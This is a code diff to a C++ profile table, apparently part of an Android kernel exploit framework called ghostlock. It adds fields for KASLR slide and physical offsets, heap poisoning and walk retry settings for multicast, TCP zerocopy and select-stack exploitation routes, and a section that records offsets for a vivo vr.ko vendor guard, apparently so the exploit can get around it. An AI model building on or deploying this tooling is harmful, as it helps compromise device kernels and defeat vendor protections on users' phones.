@@ -63,6 +63,8 @@ namespace ghostlock::binary_profile {
             PLAIN("recommend_shizuku", meta.recommend_shizuku),
             PLAIN("fallback_route", meta.fallback_route),
             PLAIN("safe_mode", meta.safe_mode),
+                    /* Ancillary behavior gate (vivo vr.ko guard). */
+            PLAIN("vr_guard", misc.vr_guard),
         };
 
         constexpr Field kTask[] = {
@@ -107,10 +109,13 @@ namespace ghostlock::binary_profile {
             PLAIN("slide_nfulnl_logger", offsets.slide_nfulnl_logger),
             PLAIN("slide_loggers_0_1", offsets.slide_loggers_0_1),
             PLAIN("slide_boot_id", offsets.slide_boot_id),
+            /* Ancillary vr.ko guard: the tracepoint the vendor probe hangs off. */
+            PLAIN("vr_sys_exit_tp", misc.vr_sys_exit_tp),
         };
 
         constexpr Field kKernel[] = {
             OPT("kernel_phys_load", misc.kernel_phys_load),
+            OPT("kernel_phys_offset", misc.kernel_phys_offset),
             OPT("compact_waiter", misc.compact_waiter),
             OPT("kernelsnitch_collisions", misc.kernelsnitch_collisions),
             OPT("mm_struct_sz", misc.mm_struct_sz),
@@ -166,6 +171,12 @@ namespace ghostlock::binary_profile {
             PLAIN("burst_calls", execution.select_consumer_burst_calls),
         };
 
+        /* Ancillary vr.ko guard layout: offsetof(struct tracepoint, funcs),
+         * derived from the image's BTF. Not a kernel-version lookup. */
+        constexpr Field kVrGuard[] = {
+            PLAIN("tracepoint_funcs", misc.vr_tracepoint_funcs),
+        };
+
         constexpr Field kRouteTcp[] = {
             PLAIN("attempts", execution.tcp_attempts),
             PLAIN("arm_sequence", execution.tcp_arm_sequence),
@@ -185,6 +196,10 @@ namespace ghostlock::binary_profile {
             OPT("buffer_size", geometry.mcast_buffer_size),
             OPT("task_offset", geometry.mcast_task_offset),
             OPT("lock_offset", geometry.mcast_lock_offset),
+            /* Poison/walk repetition; 0 means "keep the route default". */
+            PLAIN("attempts", mcast_attempts),
+            PLAIN("arm_sequence", mcast_arm_sequence),
+            PLAIN("arm_hold", mcast_arm_hold),
         };
 
         struct Section {
@@ -208,6 +223,7 @@ namespace ghostlock::binary_profile {
             {"route.tcp_zerocopy", kRouteTcp, std::size(kRouteTcp)},
             {"route.select_stack", kRouteSelect, std::size(kRouteSelect)},
             {"route.multicast_waiter", kRouteMulticast, std::size(kRouteMulticast)},
+            {"vr_guard", kVrGuard, std::size(kVrGuard)},
         };
 #undef PLAIN
 #undef OPT
